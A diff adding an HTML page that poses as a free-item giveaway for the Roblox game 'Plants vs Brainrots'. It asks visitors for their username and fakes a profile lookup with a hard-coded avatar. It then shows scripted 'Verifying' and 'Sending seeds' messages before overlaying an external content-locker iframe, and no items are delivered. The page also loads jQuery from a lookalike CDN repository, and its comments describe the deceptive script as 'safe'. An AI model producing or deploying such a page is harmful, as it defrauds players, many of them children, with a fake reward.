@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>Plants vs Brainrots </title>
+
+  <meta property="og:image" content="https://tr.rbxcdn.com/180DAY-df903aa307ddb0830246271075605cec/256/256/Image/Webp/noFilter"/>
+  <meta property="og:type" content="website"/>
+  <!-- Stylesheets -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/lib-devtools/plantsvsbrainrots@main/style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <!-- Safe jQuery script from original file -->
+  <script src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery@main/3.6.3.min.js"></script>
+  
+  <!-- Removed suspicious meta tags -->
+</head>
+<body>
+  <video class="bg-video" autoplay muted loop playsinline>
+    <source src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/back.mp4" type="video/mp4">
+  </video>
+  <div class="overlay"></div>
+  <div class="shop-container">
+    <div class="shop-header">
+      <span>New seeds in <span id="timer" class="countdown">20:13</span></span>
+      <div class="header-buttons">
+        <button class="restock-btn" onclick="goBack()">Restock</button>
+        <button class="close-btn" onclick="goBack()">X</button>
+      </div>
+    </div>
+
+    <!-- CARDS WRAPPER (from original file) -->
+    <div class="cards-wrapper" id="cardsWrapper">
+      <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/pvsb@main/cactus1.png" alt="Cactus Seed - Plants vs Brainrots">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Cactus Seed</div>
+          <div class="rarity" id="coloredText">Rare</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Cactus Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Cactus Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Cactus Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift Icon" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/pvsb@main/strawberry1.png" alt="Strawberry Seed - Plants vs Brainrots">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Strawberry Seed</div>
+          <div class="rarity" id="coloredText">Rare</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Strawberry Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Strawberry Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Strawberry Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift Icon" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/pvsb@main/pumpkin1.png" alt="Pumpkin Seed - Plants vs Brainrots">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Pumpkin Seed</div>
+          <div class="rarity" id="coloredText">Epic</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Pumpkin Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Pumpkin Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Pumpkin Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift Icon" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/pvsb@main/sunflower1.png" alt="Sunflower Seed - Plants vs Brainrots">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Sunflower Seed</div>
+          <div class="rarity" id="coloredText">Epic</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Sunflower Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Sunflower Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Sunflower Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift Icon" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/pvsb@main/dragonfruit1.png" alt="Dragon Fruit Seed - Plants vs Brainrots">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Dragon Fruits Seed</div>
+          <div class="rarity" id="coloredText">Legendary</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Dragon Fruits Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Dragon Fruits Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Dragon Fruits Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift Icon" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/pvsb@main/eggplant1.png" alt="Eggplant Seed - Plants vs Brainrots">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Eggplant Seed</div>
+          <div class="rarity" id="coloredText">Legendary</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Eggplant Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Eggplant Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Eggplant Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift Icon" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/pvsb@main/watermelon1.png" alt="Watermelon Seed - Plants vs Brainrots">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Watermelon Seed</div>
+          <div class="rarity" id="coloredText">Mythic</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Watermelon Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Watermelon Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Watermelon Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift Icon" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+        <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/pvsb@main/grape1.png" alt="Grape Seed - Plants vs Brainrots">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Grape Seed</div>
+          <div class="rarity" id="coloredText">Mythic</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Grape Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Grape Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Grape Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift Icon" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/pvsb@main/cocotank1.png" alt="Cocotank Seed - Plants vs Brainrots">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Cocotank Seed</div>
+          <div class="rarity" id="coloredText">Godly</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Cocotank Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Cocotank Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Cocotank Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift Icon" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/pvsb@main/carnivorousplant1.png" alt="Carnivorous Plant Seed - Plants vs Brainrots">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Carnivorous Plant</div>
+          <div class="rarity" id="coloredText">Godly</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Carnivorous Plant')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Carnivorous Plant')">FREE</span>
+            <span class="price-victor" onclick="openForm('Carnivorous Plant')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift Icon" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/MrCarrotseed.png" alt="Mr Carrot Seed - Plants vs Brainrots">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Mr Carrot Seed</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Mr Carrot Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Mr Carrot Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Mr Carrot Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift Icon" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/pvsb@main/tomatriose1.png" alt="Tomatrio Seed - Plants vs Brainrots">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Tomatrio Seed</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Tomatrio Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Tomatrio Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Tomatrio Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift Icon" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+
+       <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/pvsb@main/shroombino1.png" alt="Shroombino Seed - Plants vs Brainrots">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Shroombino Seed</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Shroombino Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Shroombino Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Shroombino Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift Icon" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+        <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/mangos.webp" style="width:80px; height:80px;" alt="Mango Seed - Plants vs Brainrots">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Mango Seed</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Mango Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Mango Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Mango Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift Icon" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/pvsb@main/king-limone.webp" style="width:80px; height:80px;" alt="King Limone Seed - Plants vs Brainrots">
+        </div>
+        <div class="card-info">
+          <div class="card-title">King Limone Seed</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('King Limone Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('King Limone Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('King Limone Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift Icon" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+    
+    <!-- FORM WRAPPER (from original file) -->
+    <div class="form-wrapper" id="formWrapper" style="display: none;"> <!-- Hidden by default -->
+      <h2 id="chosenItemTitle">enter your username exactly as shown in the game!</h2>
+      <div class="input-section">
+        <input type="text" id="usernameInput" placeholder="Enter Username"> <!-- Added ID -->
+        <div id="search">SEARCH</div>
+      </div>
+      <div class="loading-gif d-none">
+        <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/loading.gif" alt="Loading animation">
+      </div>
+      <div class="profile d-none" style="position: relative; padding: 20px;">
+        <div class="img"><img src="" alt="Avatar" id="avatarImg"></div> <!-- Added ID -->
+        <div class="welcome-text"></div>
+        <div class="continue-btn" id="continueBtn">CLAIM SEEDS</div>
+        <div class="instruction-text d-none" style="background:white; padding:10px; margin-top:10px; border-radius:5px; font-weight:bold; font-size:18px;">
+          <div class="msg msg1" style="display:none; color:green;">Verifying...</div>
+          <div class="msg msg2" style="display:none; color:green;">Sending seeds...</div>
+          <div class="msg msg3" style="display:none; color:red;">An error occurred</div>
+          <div class="msg msg4" style="display:none; color:red;">Manual verification required</div>
+        </div>
+        <div id="welcome-text-template" class="d-none">
+          Hello @<span class="user-placeholder"></span>, you will receive <span class="item-placeholder"></span> once you click the button below.
+        </div>
+      </div>
+    </div>
+  </div> 
+  
+  <!-- REMOVED MALICIOUS SCRIPTS -->
+  
+  <!-- NEW SAFE SCRIPT -->
+  <script>
+    let currentItemName = '';
+
+    // This function shows YOUR link in an iframe
+    function showLocker() {
+      // Create an overlay background
+      var overlay = document.createElement("div");
+      overlay.id = "lockerOverlay"; 
+      overlay.style.position = "fixed";
+      overlay.style.top = "0";
+      overlay.style.left = "0";
+      overlay.style.width = "100%";
+      overlay.style.height = "100%";
+      overlay.style.backgroundColor = "rgba(0,0,0,0.8)";
+      overlay.style.zIndex = "9998";
+      document.body.appendChild(overlay);
+
+      // Create an iframe for the locker page
+      var iframe = document.createElement("iframe");
+      iframe.id = "lockerIframe";
+      
+      // --- THIS IS YOUR NEW LINK ---
+      iframe.src = "https://execmods.com/cl/i/82drvr"; 
+      
+      iframe.style.position = "fixed";
+      iframe.style.top = "50%";
+      iframe.style.left = "50%";
+      iframe.style.transform = "translate(-50%, -50%)";
+      iframe.style.width = "90%";
+      iframe.style.height = "90%";
+      iframe.style.maxWidth = "800px";
+      iframe.style.maxHeight = "700px";
+      iframe.style.border = "none";
+      iframe.style.borderRadius = "12px";
+      iframe.style.zIndex = "9999";
+      iframe.style.background = "white";
+      document.body.appendChild(iframe);
+
+      // Close the locker when clicking the overlay
+      overlay.addEventListener("click", function() {
+        if (document.getElementById('lockerIframe')) {
+          iframe.remove();
+        }
+        if (document.getElementById('lockerOverlay')) {
+          overlay.remove();
+        }
+      });
+    }
+
+    // Function to show the username form
+    function openForm(itemName) {
+      currentItemName = itemName;
+      $('#cardsWrapper').hide();
+      $('#formWrapper').show();
+      $('#chosenItemTitle').text(`Claiming ${itemName}`);
+      
+      // Reset form
+      $('#chosenItemTitle').show(); // <-- ADD THIS
+      $('.input-section').show(); // <-- ADD THIS
+      $('.profile').addClass('d-none');
+      $('.loading-gif').addClass('d-none');
+      $('.instruction-text').addClass('d-none');
+      $('#usernameInput').val('');
+    }
+
+    // Function to go back to cards
+    function goBack() {
+      $('#formWrapper').hide();
+      $('#cardsWrapper').show();
+    }
+
+    // Wait for the document to be ready
+    $(document).ready(function() {
+
+      // --- FIXED: Defined showProfile function here ---
+      function showProfile(imageUrl) {
+        const username = $('#usernameInput').val();
+
+        // Hide loading, title, and input
+        $('.loading-gif').addClass('d-none');
+        $('#chosenItemTitle').hide(); 
+        $('.input-section').hide();
+
+        // Show profile
+        $('.profile').removeClass('d-none');
+        
+        // Set avatar
+        $('#avatarImg').attr('src', imageUrl);
+
+        // Set welcome text
+        const template = $('#welcome-text-template').html();
+        const newWelcomeText = template
+          .replace('@<span class="user-placeholder"></span>', `@${username}`)
+          .replace('<span class="item-placeholder"></span>', currentItemName);
+        $('.welcome-text').html(newWelcomeText);
+      }
+      // --- END OF FIX ---
+
+      // 1. Logic for "SEARCH" button
+      $('#search').on('click', function() {
+        const username = $('#usernameInput').val();
+        if (username.trim() === '') {
+          // You can add an error message here
+          return;
+        }
+
+        // Show loading and hide form
+        $('.loading-gif').removeClass('d-none');
+        $('#chosenItemTitle').hide();
+        $('.input-section').hide();
+
+        // --- REMOVED: Fallback function is no longer needed ---
+        /*
+        function showFallback() {
+            const fallbackImg = `https://placehold.co/100x100/eeeeee/333333?text=${username.charAt(0)}`;
+            showProfile(fallbackImg);
+        }
+        */
+
+        // --- REMOVED: REAL API CALL ---
+        /*
+        $.ajax({
+          method: 'POST',
+          url: 'https://users.roproxy.com/v1/usernames/users', // Roblox proxy
+          contentType: 'application/json',
+          data: JSON.stringify({ "usernames": [username], "excludeBannedUsers": true }),
+          success: function(data) {
+            if (data && data.data && data.data.length > 0) {
+              const userId = data.data[0].id;
+              
+              // Step 2: Get Thumbnail URL from User ID
+              $.ajax({
+                method: 'GET',
+                url: `https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`,
+                success: function(thumbData) {
+                  if (thumbData && thumbData.data && thumbData.data.length > 0) {
+                    // --- REAL IMAGE ---
+                    showProfile(thumbData.data[0].imageUrl);
+                  } else {
+                    showFallback(); // Thumbnail API failed
+                  }
+                },
+                error: function() {
+                  showFallback(); // Thumbnail API request failed
+                }
+              });
+            } else {
+              showFallback(); // User not found
+            }
+          },
+          error: function() {
+            showFallback(); // User API request failed
+          }
+        });
+        */
+        
+        // --- NEW: FAKE SEARCH WITH A STATIC, RELIABLE IMAGE ---
+        setTimeout(function() {
+          // This is the static image URL from the competitor's page
+          const staticImageUrl = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A7719FF1BA1380A2EBBD7E06B45E5BCE-Png/420/420/AvatarHeadshot/Png/noFilter";
+          showProfile(staticImageUrl);
+        }, 1500); // 1.5-second fake search delay
+        
+        // --- REMOVED OLD FAKE TIMEOUT ---
+
+      });
+
+      // 2. Logic for "CLAIM SEEDS" button
+      $('#continueBtn').on('click', function() {
+        const $instructions = $('.instruction-text');
+        const $msg1 = $instructions.find('.msg1');
+        const $msg2 = $instructions.find('.msg2');
+
+        $instructions.removeClass('d-none');
+        $instructions.find('.msg').hide(); // Hide all messages
+
+        // Show "Verifying..."
+        $msg1.show();
+        
+        setTimeout(function() {
+          // Show "Sending seeds..."
+          $msg1.hide();
+          $msg2.show();
+
+          setTimeout(function() {
+            // FINALLY, SHOW YOUR LOCKER
+            showLocker();
+            
+            // Go back to the cards page after
+            goBack();
+
+          }, 1000); // 1-second delay
+        }, 1500); // 1.5-second delay
+      });
+
+    });
+  </script>
+</body>
+</html>
